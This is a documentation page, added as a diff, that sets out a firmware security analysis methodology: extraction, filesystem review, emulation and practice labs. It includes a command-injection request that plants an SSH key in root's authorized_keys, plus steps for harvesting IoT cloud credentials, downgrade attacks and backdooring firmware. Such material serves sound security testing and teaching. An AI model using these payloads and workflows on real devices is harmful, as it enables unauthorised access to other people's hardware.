@@ -1,0 +1,240 @@
+---
+title: "Firmware Analysis"
+description: "Methodology for acquiring, extracting, and analyzing embedded device firmware — including filesystem extraction, static/dynamic analysis, emulation, downgrade attacks, and IoT credential harvesting."
+---
+
+Firmware is essential software that enables devices to operate by managing communication between hardware and software. Examining and potentially modifying firmware is a critical step in identifying security vulnerabilities in IoT devices, routers, and embedded systems.
+
+## Gathering Information
+
+Before acquiring firmware, collect:
+
+- CPU architecture and operating system
+- Bootloader specifics
+- Hardware layout and datasheets
+- External libraries and license types
+- Update histories and regulatory certifications
+- Security assessments and known CVEs
+
+Use **OSINT tools** and analyze any available open-source components. Static analysis tools like [Coverity Scan](https://scan.coverity.com) can help find issues in open-source components.
+
+## Acquiring Firmware
+
+<AccordionGroup>
+  <Accordion title="Official Sources">
+    - Download from the manufacturer's official support site
+    - Obtain directly from developers or manufacturers
+    - Build from provided source instructions
+    - Use Google dork queries to find hosted firmware files
+  </Accordion>
+
+  <Accordion title="Network Interception">
+    - Intercept OTA update traffic via MitM
+    - Sniff update requests within device communication
+    - Identify and use hardcoded update endpoints
+  </Accordion>
+
+  <Accordion title="Hardware Extraction">
+    - Extract via **UART**, **JTAG**, or **PICit** debug interfaces
+    - Dump from the bootloader
+    - Remove and read the storage chip directly with appropriate hardware tools
+  </Accordion>
+
+  <Accordion title="Cloud & App Sources">
+    - Access cloud storage directly (e.g., S3 buckets via [S3Scanner](https://github.com/sa7mon/S3Scanner))
+    - Extract from companion mobile apps (firmware often bundled in APK assets)
+    ```bash
+    apktool d vendor-app.apk -o vendor-app
+    ls vendor-app/assets/firmware
+    # firmware_v1.3.11.490_signed.bin
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Analyzing Firmware
+
+### Initial Inspection
+
+```bash
+file <bin>                          # Identify file type
+strings -n8 <bin>                   # Extract strings (min length 8)
+strings -tx <bin>                   # Print string offsets in hex
+hexdump -C -n 512 <bin> > hex.out  # First 512 bytes in hex
+hexdump -C <bin> | head            # Check header signatures
+fdisk -lu <bin>                     # List partitions
+
+# Check entropy (low = unencrypted, high = encrypted/compressed)
+binwalk -E <bin>
+```
+
+### Extracting the Filesystem
+
+```bash
+# Auto-extract with binwalk
+binwalk -ev <bin>
+
+# Manual extraction example (Squashfs)
+binwalk DIR850L_REVB.bin
+# Identify squashfs offset from output (e.g., 0x1A0094)
+dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs
+unsquashfs dir.squashfs  # Extracts to squashfs-root/
+
+# Other filesystem types:
+cpio -ivd --no-absolute-filenames -F <bin>  # CPIO archives
+jefferson rootfsfile.jffs2                  # JFFS2
+ubireader_extract_images -u UBI -s <offset> <bin>  # UBIFS
+```
+
+### Filesystem Analysis
+
+Once extracted, examine key locations:
+
+<CardGroup cols={2}>
+  <Card title="Credential Files" icon="key">
+    - `etc/shadow` and `etc/passwd` — user credentials
+    - `etc/ssl/` — SSL certificates and private keys
+    - Config files with hardcoded API keys or passwords
+  </Card>
+  <Card title="Code & Binaries" icon="code">
+    - Startup scripts (`etc/init.d/`, `etc/rc.d/`)
+    - Web server configs and CGI scripts
+    - Compiled binaries for offline analysis
+  </Card>
+</CardGroup>
+
+```bash
+# Run LinPEAS on extracted filesystem
+./linpeas.sh
+
+# Use Firmwalker for automated sensitive info search
+./firmwalker.sh /path/to/squashfs-root/
+```
+
+**Recommended tools:**
+- [FACT (Firmware Analysis and Comparison Tool)](https://github.com/fkie-cad/FACT_core)
+- [EMBA](https://github.com/e-m-b-a/emba)
+- [FwAnalyzer](https://github.com/cruise-automation/fwanalyzer)
+
+### Security Checks on Compiled Binaries
+
+```bash
+# Check for security mitigations (NX, ASLR, stack canaries, etc.)
+checksec --file=<binary>
+
+# Check binary architecture
+file ./squashfs-root/bin/busybox
+
+# Check for MIPS big-endian binary emulation
+sudo apt-get install qemu qemu-user qemu-user-static
+qemu-mips ./binary    # Big-endian MIPS
+qemu-mipsel ./binary  # Little-endian MIPS
+```
+
+## IoT Cloud Credential Harvesting
+
+Many IoT hubs fetch per-device configuration from cloud endpoints using tokens derived from a hardcoded secret:
+
+```bash
+# 1. Extract deviceId from UART boot logs
+picocom -b 115200 /dev/ttyUSB0
+# Look for: Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
+
+# 2. Recover STATIC_KEY from firmware (Ghidra/radare2, search for "/pf/" or MD5 usage)
+
+# 3. Derive the token
+DEVICE_ID="d88b00112233"
+STATIC_KEY="cf50deadbeefcafebabe"
+printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
+
+# 4. Fetch cloud config
+API_HOST="https://api.vendor.tld"
+TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
+curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
+
+# 5. Subscribe to MQTT topics with harvested credentials
+mosquitto_sub -h <broker> -p <port> -V mqttv311 \
+  -i <client_id> -u <username> -P <password> \
+  -t "<topic_prefix>/<deviceId>/admin" -v
+```
+
+## Firmware Downgrade Attacks
+
+Even when vendors implement cryptographic signature checks, **version rollback protection is frequently omitted**. If the bootloader only verifies the signature but not the version number, older vulnerable firmware with valid signatures can be re-flashed.
+
+### Attack Workflow
+
+<Steps>
+  <Step title="Obtain Older Signed Image">
+    - Download from vendor portal or CDN
+    - Extract from companion mobile app APK (`assets/firmware/`)
+    - Retrieve from VirusTotal, Internet archives, forums
+  </Step>
+  <Step title="Upload to Device">
+    Via any exposed update channel: Web UI, mobile-app API, USB, TFTP, MQTT.
+    Many consumer IoT devices accept unauthenticated HTTP POST requests with firmware blobs.
+  </Step>
+  <Step title="Exploit Patched Vulnerability">
+    After downgrade, exploit the vulnerability that was patched in the newer version.
+    ```http
+    POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
+    ```
+  </Step>
+</Steps>
+
+### Update Logic Assessment Checklist
+
+- [ ] Is the update endpoint protected with TLS + authentication?
+- [ ] Does the device compare **version numbers** or a **monotonic anti-rollback counter**?
+- [ ] Is the image verified inside a secure boot chain?
+- [ ] Does userland code perform additional sanity checks (model number, partition map)?
+- [ ] Do partial/backup update flows reuse the same validation logic?
+
+## Emulation for Dynamic Analysis
+
+```bash
+# Full firmware emulation with Firmadyne
+git clone https://github.com/firmadyne/firmadyne
+
+# Individual binary emulation
+qemu-mips -L ./squashfs-root ./squashfs-root/bin/busybox ls
+
+# Chroot emulation
+copy_qemu_static=$(which qemu-mips-static)
+cp $copy_qemu_static ./squashfs-root/usr/bin/
+chroot ./squashfs-root /usr/bin/qemu-mips-static /bin/sh
+```
+
+## Firmware Integrity & Backdooring
+
+If integrity or signature verification flaws exist in the update process, a modified firmware can be uploaded. The general workflow:
+
+1. Extract with **firmware-mod-kit (FMK)**
+2. Identify target architecture and endianness
+3. Build a cross compiler (e.g., Buildroot) and compile a backdoor
+4. Copy backdoor to `usr/bin/` in extracted rootfs
+5. Repackage with FMK
+6. Upload via the update mechanism and test connectivity via netcat
+
+## Practice Targets
+
+<CardGroup cols={2}>
+  <Card title="OWASP IoTGoat" icon="shield">
+    Intentionally vulnerable IoT firmware for practice: [github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
+  </Card>
+  <Card title="DVRF" icon="bug">
+    Damn Vulnerable Router Firmware: [github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
+  </Card>
+  <Card title="DVID" icon="cpu">
+    Damn Vulnerable IoT Device: [github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
+  </Card>
+  <Card title="AttifyOS" icon="terminal">
+    Pre-configured OS with firmware analysis tools: [github.com/adi0x90/attifyos](https://github.com/adi0x90/attifyos)
+  </Card>
+</CardGroup>
+
+## References
+
+- [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
+- [Practical IoT Hacking — Chantzis et al.](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
+- [Exploiting zero days in abandoned hardware — Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [How a $20 Smart Device Gave Me Access to Your Home — Bishop Fox](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
